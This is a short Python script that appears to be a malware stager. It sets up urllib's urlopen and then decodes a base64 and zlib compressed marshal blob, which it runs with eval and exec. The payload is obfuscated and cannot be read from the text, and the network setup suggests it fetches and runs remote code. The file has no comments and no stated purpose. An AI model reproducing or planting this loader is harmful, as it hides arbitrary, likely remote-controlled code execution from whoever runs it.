import sys, zlib, base64, marshal, json, urllib
if sys.version_info[0] > 2:
	from urllib import request
	urlopen = urllib.request.urlopen if sys.version_info[0]>2 else urllib.urlopen
exec(eval(marshal.loads(zlib.decompress(base64.b64decode('eJwrNmNgYCgtyskvSMTUM8oKSmw0tc3NNAz0DPSMzS1MjEx09cvLklMTy0q1i81NdIrqFTX1CtKTUzR0AQA72wQxQ==')))))
